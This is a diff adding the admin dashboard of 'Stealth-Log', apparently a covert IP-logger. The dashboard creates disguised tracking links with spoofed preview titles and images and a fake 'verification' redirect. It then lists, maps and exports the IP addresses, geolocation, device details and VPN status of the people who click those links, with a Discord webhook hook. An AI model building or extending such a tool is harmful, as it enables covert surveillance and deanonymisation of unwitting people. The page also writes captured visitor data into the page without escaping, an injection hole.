@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Stealth-Log Admin</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <style>
+    :root { --bg:#0a0a0f; }
+    body { background: var(--bg); }
+    .glass { background: rgba(15,15,25,0.72); backdrop-filter: blur(16px); border: 1px solid rgba(59,130,246,0.15); }
+    .row-hover:hover { background: rgba(59,130,246,0.06); }
+    .toast { position: fixed; bottom: 20px; right: 20px; z-index: 100; }
+    .skeleton { background: linear-gradient(90deg,#1f2937 25%,#374151 50%,#1f2937 75%); background-size: 200% 100%; animation: shimmer 1.4s infinite; border-radius: 6px; }
+    @keyframes shimmer { 0%{background-position:200% 0} 100%{background-position:-200% 0} }
+    .badge { font-size: 11px; padding: 2px 8px; border-radius: 9999px; }
+  </style>
+</head>
+<body class="text-gray-100 min-h-screen">
+  <!-- Toast container -->
+  <div id="toastWrap" class="toast space-y-2"></div>
+
+  <!-- Login -->
+  <div id="loginScreen" class="min-h-screen flex items-center justify-center p-4">
+    <div class="glass rounded-2xl p-8 w-full max-w-md shadow-2xl">
+      <div class="text-center mb-6">
+        <div class="text-5xl mb-3">🛡️</div>
+        <h1 class="text-2xl font-bold">Stealth-Log Admin</h1>
+        <p class="text-gray-400 text-sm mt-1">Sign in to view captures</p>
+      </div>
+      <form id="loginForm" class="space-y-4">
+        <input id="username" placeholder="Username" autocomplete="username" class="w-full bg-gray-900/60 border border-gray-700 rounded-lg px-4 py-2.5 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500" />
+        <input id="password" type="password" placeholder="Password" autocomplete="current-password" class="w-full bg-gray-900/60 border border-gray-700 rounded-lg px-4 py-2.5 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500" />
+        <button class="w-full bg-blue-600 hover:bg-blue-500 rounded-lg py-2.5 font-semibold transition shadow-lg shadow-blue-900/30">Sign In</button>
+        <p id="loginError" class="text-red-400 text-sm hidden text-center"></p>
+      </form>
+      <p class="text-xs text-gray-500 text-center mt-4">Ethical use only · PrivMITLab</p>
+    </div>
+  </div>
+
+  <!-- Dashboard -->
+  <div id="dashboard" class="hidden">
+    <nav class="glass sticky top-0 z-30 px-6 py-3 flex items-center justify-between">
+      <div class="flex items-center gap-3">
+        <span class="text-2xl">🛡️</span>
+        <span class="font-bold text-lg">Stealth-Log</span>
+        <span class="text-xs text-gray-400 px-2 py-0.5 rounded bg-gray-800" id="dbType">DB: …</span>
+        <span class="text-xs text-gray-500" id="lastRefresh"></span>
+      </div>
+      <div class="flex items-center gap-3">
+        <span id="whoami" class="text-sm text-gray-400"></span>
+        <button onclick="openSettings()" class="bg-gray-800 hover:bg-gray-700 px-3 py-1.5 rounded-lg text-sm">⚙️ Settings</button>
+        <button onclick="logout()" class="bg-gray-800 hover:bg-gray-700 px-3 py-1.5 rounded-lg text-sm">Logout</button>
+      </div>
+    </nav>
+
+    <main class="p-6 space-y-6 max-w-7xl mx-auto">
+      <!-- Stats -->
+      <div class="grid grid-cols-2 md:grid-cols-5 gap-4" id="statCards">
+        <div class="glass rounded-2xl p-4 skeleton h-20"></div>
+      </div>
+
+      <!-- Charts -->
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+        <div class="glass rounded-2xl p-4"><h3 class="font-semibold mb-2 flex items-center gap-2">🌍 Top Countries</h3><canvas id="countriesChart" height="180"></canvas></div>
+        <div class="glass rounded-2xl p-4"><h3 class="font-semibold mb-2 flex items-center gap-2">🌐 Browsers</h3><canvas id="browsersChart" height="180"></canvas></div>
+      </div>
+
+      <!-- Map -->
+      <div class="glass rounded-2xl p-4">
+        <h3 class="font-semibold mb-2 flex items-center gap-2">🗺️ Capture Map</h3>
+        <div id="captureMap" class="rounded-xl" style="height:320px;background:#111;"></div>
+        <p class="text-xs text-gray-500 mt-2">Markers show captures with location data.</p>
+      </div>
+
+      <!-- Filters + table -->
+      <div class="glass rounded-2xl p-4 space-y-4">
+        <div class="flex flex-wrap gap-3 items-center justify-between">
+          <div class="flex flex-wrap gap-2 items-center">
+            <input id="searchInput" placeholder="Search ip/city/country/browser/os" class="bg-gray-900/60 border border-gray-700 rounded-lg px-3 py-2 text-sm w-64" />
+            <select id="countryFilter" class="bg-gray-900/60 border border-gray-700 rounded-lg px-3 py-2 text-sm">
+              <option value="">All countries</option>
+            </select>
+            <input id="fromDate" type="date" class="bg-gray-900/60 border border-gray-700 rounded-lg px-3 py-2 text-sm" />
+            <input id="toDate" type="date" class="bg-gray-900/60 border border-gray-700 rounded-lg px-3 py-2 text-sm" />
+            <button onclick="applyFilters()" class="bg-blue-600 hover:bg-blue-500 px-4 py-2 rounded-lg text-sm font-medium">Apply</button>
+            <button onclick="resetFilters()" class="bg-gray-800 hover:bg-gray-700 px-3 py-2 rounded-lg text-sm">Reset</button>
+          </div>
+          <div class="flex gap-2">
+            <button onclick="exportCsv()" class="bg-emerald-600 hover:bg-emerald-500 px-3 py-2 rounded-lg text-sm">⬇ CSV</button>
+            <button onclick="exportJson()" class="bg-emerald-700 hover:bg-emerald-600 px-3 py-2 rounded-lg text-sm">⬇ JSON</button>
+            <button onclick="clearAll()" class="bg-red-600 hover:bg-red-500 px-3 py-2 rounded-lg text-sm">🗑 Clear</button>
+            <button onclick="loadCaptures(); loadStats();" class="bg-gray-800 hover:bg-gray-700 px-3 py-2 rounded-lg text-sm">↻ Refresh</button>
+          </div>
+        </div>
+
+        <div class="overflow-x-auto">
+          <table class="w-full text-sm">
+            <thead class="text-gray-400 border-b border-gray-800 text-xs uppercase">
+              <tr>
+                <th class="text-left p-2">#</th>
+                <th class="text-left p-2">IP</th>
+                <th class="text-left p-2">Location</th>
+                <th class="text-left p-2">Device</th>
+                <th class="text-left p-2">Browser / OS</th>
+                <th class="text-left p-2">Security</th>
+                <th class="text-left p-2">When</th>
+                <th class="text-left p-2">Actions</th>
+              </tr>
+            </thead>
+            <tbody id="captureRows"></tbody>
+          </table>
+        </div>
+        <div id="emptyState" class="hidden text-center py-10 text-gray-500">
+          <div class="text-4xl mb-2">📭</div>
+          <p>No captures yet. Open the tracker page to generate one.</p>
+        </div>
+        <div class="flex justify-between items-center text-sm text-gray-400">
+          <span id="pageInfo"></span>
+          <div class="flex gap-2">
+            <button onclick="prevPage()" class="px-3 py-1 bg-gray-800 rounded hover:bg-gray-700">Prev</button>
+            <button onclick="nextPage()" class="px-3 py-1 bg-gray-800 rounded hover:bg-gray-700">Next</button>
+          </div>
+        </div>
+      </div>
+      <!-- Links management -->
+      <div class="glass rounded-2xl p-4 space-y-4">
+        <div class="flex items-center justify-between">
+          <h3 class="font-semibold text-lg">🔗 Tracking Links</h3>
+          <button onclick="openLinkForm()" class="bg-blue-600 hover:bg-blue-500 px-3 py-2 rounded-lg text-sm">+ Create Link</button>
+        </div>
+        <div class="overflow-x-auto">
+          <table class="w-full text-sm">
+            <thead class="text-gray-400 border-b border-gray-800 text-xs uppercase">
+              <tr>
+                <th class="text-left p-2">Name / Slug</th>
+                <th class="text-left p-2">URL</th>
+                <th class="text-left p-2">Redirect</th>
+                <th class="text-left p-2">Visits</th>
+                <th class="text-left p-2">Expires</th>
+                <th class="text-left p-2">Actions</th>
+              </tr>
+            </thead>
+            <tbody id="linksRows"></tbody>
+          </table>
+        </div>
+        <div id="linksEmpty" class="hidden text-center py-6 text-gray-500 text-sm">No tracking links yet. Create one to start collecting.</div>
+      </div>
+
+      <!-- Create link modal -->
+      <div id="linkModal" class="hidden fixed inset-0 bg-black/70 z-50 flex items-center justify-center p-4">
+        <div class="glass rounded-2xl p-6 w-full max-w-lg">
+          <div class="flex justify-between items-center mb-4">
+            <h3 class="font-bold text-lg">Create Tracking Link</h3>
+            <button onclick="closeLinkForm()" class="text-gray-400 hover:text-white text-xl">✕</button>
+          </div>
+          <div class="space-y-3">
+            <input id="linkName" placeholder="Name (optional)" class="w-full bg-gray-900/60 border border-gray-700 rounded-lg px-3 py-2 text-sm" />
+            <input id="linkSlug" placeholder="Slug (optional, auto-generated)" class="w-full bg-gray-900/60 border border-gray-700 rounded-lg px-3 py-2 text-sm" />
+            <input id="linkRedirect" placeholder="Redirect URL (required)" class="w-full bg-gray-900/60 border border-gray-700 rounded-lg px-3 py-2 text-sm" />
+            <input id="linkMaxVisits" type="number" placeholder="Max visits (optional)" class="w-full bg-gray-900/60 border border-gray-700 rounded-lg px-3 py-2 text-sm" />
+            <input id="linkExpires" type="datetime-local" class="w-full bg-gray-900/60 border border-gray-700 rounded-lg px-3 py-2 text-sm" />
+            <input id="linkOgTitle" placeholder="OG title (optional)" class="w-full bg-gray-900/60 border border-gray-700 rounded-lg px-3 py-2 text-sm" />
+            <input id="linkOgImage" placeholder="OG image URL (optional)" class="w-full bg-gray-900/60 border border-gray-700 rounded-lg px-3 py-2 text-sm" />
+            <button onclick="createLink()" class="w-full bg-blue-600 hover:bg-blue-500 py-2 rounded-lg text-sm font-medium">Create</button>
+          </div>
+        </div>
+      </div>
+    </main>
+  </div>
+
+  <!-- Detail modal -->
+  <div id="modal" class="hidden fixed inset-0 bg-black/70 z-50 flex items-center justify-center p-4">
+    <div class="glass rounded-2xl p-6 w-full max-w-4xl max-h-[85vh] overflow-auto">
+      <div class="flex justify-between items-center mb-4">
+        <h3 class="font-bold text-lg">Capture Detail</h3>
+        <button onclick="closeModal()" class="text-gray-400 hover:text-white text-xl">✕</button>
+      </div>
+      <div id="modalSummary" class="grid grid-cols-2 md:grid-cols-4 gap-2 mb-4 text-xs"></div>
+      <pre id="modalBody" class="text-xs whitespace-pre-wrap break-all bg-gray-900/50 rounded p-3"></pre>
+    </div>
+  </div>
+
+  <!-- Settings modal -->
+  <div id="settingsModal" class="hidden fixed inset-0 bg-black/70 z-50 flex items-center justify-center p-4">
+    <div class="glass rounded-2xl p-6 w-full max-w-lg">
+      <div class="flex justify-between items-center mb-4">
+        <h3 class="font-bold text-lg">⚙️ Settings</h3>
+        <button onclick="closeSettings()" class="text-gray-400 hover:text-white text-xl">✕</button>
+      </div>
+      <div class="space-y-4">
+        <div>
+          <label class="text-sm text-gray-400">Redirect URL (after capture)</label>
+          <input id="redirectUrlInput" class="w-full bg-gray-900/60 border border-gray-700 rounded-lg px-3 py-2 mt-1" />
+          <p class="text-xs text-gray-500 mt-1">Where visitors go after "verification".</p>
+        </div>
+        <button onclick="saveSettings()" class="bg-blue-600 hover:bg-blue-500 px-4 py-2 rounded-lg text-sm font-medium">Save</button>
+        <div class="border-t border-gray-800 pt-4">
+          <button onclick="testWebhook()" class="bg-purple-600 hover:bg-purple-500 px-4 py-2 rounded-lg text-sm">Test Discord Webhook</button>
+          <p id="webhookStatus" class="text-xs text-gray-400 mt-2"></p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const API = '';
+    let token = localStorage.getItem('sl_token');
+    let offset = 0; const limit = 25;
+    let lastTotal = 0;
+    let countriesChart, browsersChart;
+    let captureMap, markersLayer;
+    let refreshTimer;
+    let eventSource;
+
+    function toast(msg, type = 'info') {
+      const colors = { info: 'bg-blue-600', success: 'bg-emerald-600', error: 'bg-red-600', warn: 'bg-amber-600' };
+      const el = document.createElement('div');
+      el.className = `${colors[type] || colors.info} text-white px-4 py-2 rounded-lg shadow-lg text-sm`;
+      el.textContent = msg;
+      document.getElementById('toastWrap').appendChild(el);
+      setTimeout(() => el.remove(), 3500);
+    }
+
+    async function api(path, opts = {}) {
+      const headers = { 'Content-Type': 'application/json', ...(opts.headers || {}) };
+      if (token) headers['Authorization'] = 'Bearer ' + token;
+      const res = await fetch(API + path, { ...opts, headers });
+      if (res.status === 401) { logout(); throw new Error('Unauthorized'); }
+      return res;
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value;
+      const btn = e.target.querySelector('button');
+      btn.disabled = true; btn.textContent = 'Signing in…';
+      const res = await fetch('/api/auth/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username, password }) });
+      btn.disabled = false; btn.textContent = 'Sign In';
+      if (!res.ok) {
+        document.getElementById('loginError').textContent = 'Invalid credentials';
+        document.getElementById('loginError').classList.remove('hidden');
+        return;
+      }
+      const data = await res.json();
+      token = data.token;
+      localStorage.setItem('sl_token', token);
+      localStorage.setItem('sl_user', data.username);
+      showDashboard(data.username);
+    });
+
+    function logout() {
+      token = null; localStorage.removeItem('sl_token'); localStorage.removeItem('sl_user');
+      if (refreshTimer) clearInterval(refreshTimer);
+      document.getElementById('dashboard').classList.add('hidden');
+      document.getElementById('loginScreen').classList.remove('hidden');
+    }
+
+    async function showDashboard(username) {
+      document.getElementById('loginScreen').classList.add('hidden');
+      document.getElementById('dashboard').classList.remove('hidden');
+      document.getElementById('whoami').textContent = username || '';
+      try {
+        const h = await fetch('/health'); const hd = await h.json();
+        document.getElementById('dbType').textContent = 'DB: ' + hd.db;
+      } catch (e) {}
+      await loadCountries();
+      await loadStats();
+      await loadCaptures();
+      await loadLinks();
+      initMap();
+      startStream();
+      refreshTimer = setInterval(() => { loadCaptures(); loadLinks(); }, 30000);
+    }
+
+    async function loadCountries() {
+      try {
+        const res = await api('/api/admin/countries');
+        const list = await res.json();
+        const sel = document.getElementById('countryFilter');
+        sel.innerHTML = '<option value="">All countries</option>' + list.map(c => `<option value="${c}">${c}</option>`).join('');
+      } catch (e) {}
+    }
+
+    async function loadStats() {
+      try {
+        const res = await api('/api/admin/stats');
+        const s = await res.json();
+        const cards = [
+          { label: 'Total Captures', value: s.total, color: 'blue' },
+          { label: 'Last 24h', value: s.last24h, color: 'cyan' },
+          { label: 'Today', value: s.today, color: 'emerald' },
+          { label: 'Unique IPs', value: s.uniqueIps, color: 'purple' },
+          { label: 'VPN/Proxy', value: s.vpnCount, color: 'amber' },
+        ];
+        document.getElementById('statCards').innerHTML = cards.map(c =>
+          `<div class="glass rounded-2xl p-4"><div class="text-gray-400 text-xs uppercase tracking-wide">${c.label}</div><div class="text-3xl font-bold mt-1">${c.value}</div></div>`
+        ).join('');
+
+        if (countriesChart) countriesChart.destroy();
+        countriesChart = new Chart(document.getElementById('countriesChart'), {
+          type: 'bar',
+          data: { labels: (s.countries||[]).map(x=>x.country||'??'), datasets: [{ label: 'captures', data: (s.countries||[]).map(x=>x.c), backgroundColor: '#3b82f6', borderRadius: 6 }] },
+          options: { plugins: { legend: { display: false } }, scales: { y: { beginAtZero: true, ticks: { precision: 0 } } } }
+        });
+        if (browsersChart) browsersChart.destroy();
+        browsersChart = new Chart(document.getElementById('browsersChart'), {
+          type: 'doughnut',
+          data: { labels: (s.browsers||[]).map(x=>x.parsedBrowser||'??'), datasets: [{ data: (s.browsers||[]).map(x=>x.c), backgroundColor: ['#3b82f6','#8b5cf6','#06b6d4','#10b981','#f59e0b','#ef4444','#ec4899'] }] },
+          options: { plugins: { legend: { position: 'right', labels: { boxWidth: 12, font: { size: 11 } } } } }
+        });
+        document.getElementById('lastRefresh').textContent = 'Updated ' + new Date().toLocaleTimeString();
+      } catch (e) { toast('Failed to load stats', 'error'); }
+    }
+
+    function initMap() {
+      if (captureMap) return;
+      captureMap = L.map('captureMap').setView([20, 0], 2);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        attribution: '&copy; OpenStreetMap contributors', maxZoom: 18
+      }).addTo(captureMap);
+      markersLayer = L.layerGroup().addTo(captureMap);
+      updateMapMarkers();
+    }
+    async function updateMapMarkers() {
+      if (!markersLayer) return;
+      markersLayer.clearLayers();
+      try {
+        const res = await api('/api/admin/captures?limit=200&offset=0');
+        const data = await res.json();
+        for (const r of (data.rows || [])) {
+          if (r.lat && r.lon) {
+            const m = L.marker([r.lat, r.lon]);
+            m.bindPopup(`<b>${r.ip || ''}</b><br>${r.city || ''}, ${r.country || ''}<br>${r.parsedBrowser || ''} / ${r.parsedOS || ''}<br><small>${r.createdAt || ''}</small>`);
+            markersLayer.addLayer(m);
+          }
+        }
+      } catch (e) {}
+    }
+    function startStream() {
+      if (eventSource) eventSource.close();
+      eventSource = new EventSource('/api/admin/stream?token=' + encodeURIComponent(token));
+      eventSource.onmessage = (ev) => {
+        try {
+          const d = JSON.parse(ev.data);
+          if (d.stats) {
+            // update stat cards quickly
+            const s = d.stats;
+            const cards = [
+              { label: 'Total Captures', value: s.total, color: 'blue' },
+              { label: 'Last 24h', value: s.last24h, color: 'cyan' },
+              { label: 'Today', value: s.today, color: 'emerald' },
+              { label: 'Unique IPs', value: s.uniqueIps, color: 'purple' },
+              { label: 'VPN/Proxy', value: s.vpnCount, color: 'amber' },
+            ];
+            document.getElementById('statCards').innerHTML = cards.map(c =>
+              `<div class="glass rounded-2xl p-4"><div class="text-gray-400 text-xs uppercase tracking-wide">${c.label}</div><div class="text-3xl font-bold mt-1">${c.value}</div></div>`
+            ).join('');
+            document.getElementById('lastRefresh').textContent = 'Live ' + new Date().toLocaleTimeString();
+          }
+          if (d.recent) { updateMapMarkers(); }
+        } catch (e) {}
+      };
+      eventSource.onerror = () => { /* auto-reconnect */ };
+    }
+
+    function getFilters() {
+      return {
+        search: document.getElementById('searchInput').value.trim(),
+        country: document.getElementById('countryFilter').value,
+        from: document.getElementById('fromDate').value,
+        to: document.getElementById('toDate').value,
+      };
+    }
+    function applyFilters() { offset = 0; loadCaptures(); }
+    function resetFilters() {
+      document.getElementById('searchInput').value = '';
+      document.getElementById('countryFilter').value = '';
+      document.getElementById('fromDate').value = '';
+      document.getElementById('toDate').value = '';
+      offset = 0; loadCaptures();
+    }
+
+    async function loadCaptures() {
+      const f = getFilters();
+      const params = new URLSearchParams({ limit, offset, search: f.search, country: f.country, from: f.from, to: f.to });
+      try {
+        const res = await api('/api/admin/captures?' + params.toString());
+        const data = await res.json();
+        lastTotal = data.total;
+        const tbody = document.getElementById('captureRows');
+        const empty = document.getElementById('emptyState');
+        if (!data.rows || data.rows.length === 0) {
+          tbody.innerHTML = '';
+          empty.classList.remove('hidden');
+        } else {
+          empty.classList.add('hidden');
+          tbody.innerHTML = data.rows.map(r => {
+            const sec = r.proxy ? '🔴 VPN' : (r.hosting ? '🟡 DC' : '✅ Clean');
+            return `
+            <tr class="row-hover border-b border-gray-900">
+              <td class="p-2 text-gray-500">${r.id}</td>
+              <td class="p-2 font-mono text-xs">${r.ip || '-'}</td>
+              <td class="p-2">${r.city || '-'}<br><span class="text-xs text-gray-500">${r.country || '-'}</span></td>
+              <td class="p-2">${r.deviceType || '-'}</td>
+              <td class="p-2">${r.parsedBrowser || '-'}<br><span class="text-xs text-gray-500">${r.parsedOS || '-'}</span></td>
+              <td class="p-2"><span class="badge ${r.proxy?'bg-red-900/40 text-red-300':(r.hosting?'bg-amber-900/40 text-amber-300':'bg-emerald-900/40 text-emerald-300')}">${sec}</span></td>
+              <td class="p-2 text-xs text-gray-400">${r.createdAt || '-'}</td>
+              <td class="p-2 flex gap-2">
+                <button onclick="viewDetail(${r.id})" class="text-blue-400 hover:underline text-xs">View</button>
+                <button onclick="delCapture(${r.id})" class="text-red-400 hover:underline text-xs">Del</button>
+              </td>
+            </tr>`;
+          }).join('');
+        }
+        document.getElementById('pageInfo').textContent = lastTotal ? `Showing ${offset + 1}-${Math.min(offset + limit, lastTotal)} of ${lastTotal}` : '0 results';
+      } catch (e) { toast('Failed to load captures', 'error'); }
+    }
+
+    function nextPage() { if (offset + limit < lastTotal) { offset += limit; loadCaptures(); } }
+    function prevPage() { if (offset > 0) { offset = Math.max(0, offset - limit); loadCaptures(); } }
+
+    async function viewDetail(id) {
+      try {
+        const res = await api('/api/admin/captures/' + id);
+        const data = await res.json();
+        const summary = [
+          ['IP', data.ip], ['City', data.city], ['Country', data.country],
+          ['Browser', data.parsedBrowser], ['OS', data.parsedOS], ['Device', data.deviceType],
+          ['Screen', data.screenWidth + '×' + data.screenHeight], ['VPN', data.proxy ? 'Yes' : 'No'],
+        ];
+        document.getElementById('modalSummary').innerHTML = summary.map(([k,v]) =>
+          `<div class="glass rounded p-2"><div class="text-gray-500 text-[10px] uppercase">${k}</div><div class="truncate">${v ?? '-'}</div></div>`
+        ).join('');
+        // map link
+        let extra = '';
+        if (data.lat && data.lon) extra = `\n🗺️ Map: https://www.google.com/maps?q=${data.lat},${data.lon}\n`;
+        document.getElementById('modalBody').textContent = JSON.stringify(data, null, 2) + extra;
+        document.getElementById('modal').classList.remove('hidden');
+      } catch (e) { toast('Failed to load detail', 'error'); }
+    }
+    function closeModal() { document.getElementById('modal').classList.add('hidden'); }
+
+    async function delCapture(id) {
+      if (!confirm('Delete capture #' + id + '?')) return;
+      await api('/api/admin/captures/' + id, { method: 'DELETE' });
+      toast('Deleted', 'success');
+      loadCaptures(); loadStats();
+    }
+    async function clearAll() {
+      if (!confirm('Delete ALL captures? This cannot be undone.')) return;
+      await api('/api/admin/captures', { method: 'DELETE' });
+      offset = 0; toast('Cleared all', 'success'); loadCaptures(); loadStats();
+    }
+    async function exportCsv() {
+      const res = await api('/api/admin/export.csv');
+      const blob = await res.blob();
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a'); a.href = url; a.download = 'captures.csv'; a.click();
+      toast('CSV exported', 'success');
+    }
+    async function exportJson() {
+      const res = await api('/api/admin/export.json');
+      const blob = await res.blob();
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a'); a.href = url; a.download = 'captures.json'; a.click();
+      toast('JSON exported', 'success');
+    }
+
+    // Settings
+    async function openSettings() {
+      document.getElementById('settingsModal').classList.remove('hidden');
+      try {
+        const res = await api('/api/admin/settings');
+        const s = await res.json();
+        document.getElementById('redirectUrlInput').value = s.redirect_url || '';
+        document.getElementById('webhookStatus').textContent = s.discord_webhook_set ? 'Discord webhook: configured ✅' : 'Discord webhook: not set (env)';
+      } catch (e) {}
+    }
+    function closeSettings() { document.getElementById('settingsModal').classList.add('hidden'); }
+    async function saveSettings() {
+      const redirect_url = document.getElementById('redirectUrlInput').value.trim();
+      try {
+        await api('/api/admin/settings', { method: 'PUT', body: JSON.stringify({ redirect_url }) });
+        toast('Settings saved', 'success');
+        closeSettings();
+      } catch (e) { toast('Save failed', 'error'); }
+    }
+    async function testWebhook() {
+      try {
+        const res = await api('/api/admin/test-webhook', { method: 'POST' });
+        const d = await res.json();
+        document.getElementById('webhookStatus').textContent = d.ok ? 'Webhook OK ✅' : 'Webhook failed ❌ (' + d.status + ')';
+      } catch (e) { toast('Webhook test failed', 'error'); }
+    }
+
+    async function loadLinks() {
+      try {
+        const res = await api('/api/admin/links');
+        const links = await res.json();
+        const tbody = document.getElementById('linksRows');
+        const empty = document.getElementById('linksEmpty');
+        if (!links || links.length === 0) { tbody.innerHTML = ''; empty.classList.remove('hidden'); return; }
+        empty.classList.add('hidden');
+        tbody.innerHTML = links.map(l => {
+          const url = `${location.origin}/t/${l.slug}`;
+          const expired = l.expiresAt && new Date(l.expiresAt) < new Date();
+          const maxed = l.maxVisits && l.visitCount >= l.maxVisits;
+          const status = (!l.active || expired || maxed) ? '🔴' : '🟢';
+          return `
+          <tr class="row-hover border-b border-gray-900">
+            <td class="p-2">${status} ${l.name || '-'}<br><span class="text-xs text-gray-500">${l.slug}</span></td>
+            <td class="p-2"><button onclick="copyText('${url}')" class="text-blue-400 hover:underline text-xs break-all">${url}</button></td>
+            <td class="p-2 text-xs break-all">${l.redirectUrl}</td>
+            <td class="p-2">${l.visitCount}${l.maxVisits ? '/' + l.maxVisits : ''}</td>
+            <td class="p-2 text-xs">${l.expiresAt ? new Date(l.expiresAt).toLocaleString() : 'Never'}</td>
+            <td class="p-2 flex gap-2">
+              <button onclick="viewLinkStats(${l.id})" class="text-blue-400 hover:underline text-xs">Stats</button>
+              <button onclick="deleteLink(${l.id})" class="text-red-400 hover:underline text-xs">Del</button>
+            </td>
+          </tr>`;
+        }).join('');
+      } catch (e) { toast('Failed to load links', 'error'); }
+    }
+    function openLinkForm() { document.getElementById('linkModal').classList.remove('hidden'); }
+    function closeLinkForm() { document.getElementById('linkModal').classList.add('hidden'); }
+    async function createLink() {
+      const body = {
+        name: document.getElementById('linkName').value.trim() || undefined,
+        slug: document.getElementById('linkSlug').value.trim() || undefined,
+        redirectUrl: document.getElementById('linkRedirect').value.trim(),
+        maxVisits: document.getElementById('linkMaxVisits').value ? parseInt(document.getElementById('linkMaxVisits').value) : undefined,
+        expiresAt: document.getElementById('linkExpires').value ? new Date(document.getElementById('linkExpires').value).toISOString() : undefined,
+        ogTitle: document.getElementById('linkOgTitle').value.trim() || undefined,
+        ogImage: document.getElementById('linkOgImage').value.trim() || undefined,
+      };
+      if (!body.redirectUrl) { toast('Redirect URL required', 'error'); return; }
+      try {
+        const res = await api('/api/admin/links', { method: 'POST', body: JSON.stringify(body) });
+        const d = await res.json();
+        toast('Link created: ' + d.slug, 'success');
+        closeLinkForm();
+        loadLinks();
+      } catch (e) { toast('Create failed', 'error'); }
+    }
+    async function deleteLink(id) {
+      if (!confirm('Delete link #' + id + ' and its captures?')) return;
+      await api('/api/admin/links/' + id, { method: 'DELETE' });
+      toast('Deleted', 'success');
+      loadLinks(); loadCaptures(); loadStats();
+    }
+    async function viewLinkStats(id) {
+      const res = await api('/api/admin/links/' + id + '/stats');
+      const d = await res.json();
+      document.getElementById('modalSummary').innerHTML = '';
+      document.getElementById('modalBody').textContent = JSON.stringify(d, null, 2);
+      document.getElementById('modal').classList.remove('hidden');
+    }
+    function copyText(t) { navigator.clipboard.writeText(t); toast('Copied', 'success'); }
+
+    if (token) {
+      fetch('/api/auth/me', { headers: { Authorization: 'Bearer ' + token } }).then(r => {
+        if (r.ok) showDashboard(localStorage.getItem('sl_user') || 'admin');
+        else logout();
+      }).catch(() => logout());
+    }
+  </script>
+</body>
+</html>
